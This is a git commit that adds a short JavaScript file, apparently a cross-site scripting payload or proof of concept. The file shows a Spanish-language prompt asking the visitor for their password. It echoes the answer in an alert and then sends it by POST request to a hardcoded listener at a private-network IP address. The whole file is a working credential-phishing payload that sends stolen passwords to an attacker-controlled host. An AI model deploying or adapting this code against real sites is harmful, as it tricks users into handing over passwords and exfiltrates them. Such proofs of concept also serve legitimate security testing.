80f776f3fe1cc0f63c5b1fede20cd2fdaedf06a5
Omar Espino <omespino@gmail.com>
2024-09-05 12:15:57 -0700

    Add files via upload

---
+++ 1.js
@@ -0,0 +1,11 @@
+var pass=prompt('Para continuar inserta tu contraseña');
+alert(pass)
+
+function send_response(response){
+	var oReqX = new XMLHttpRequest();
+	oReqX.open("POST","http://192.168.137.164:8090/");
+	oReqX.send(response);
+}
+
+send_response(pass)
+
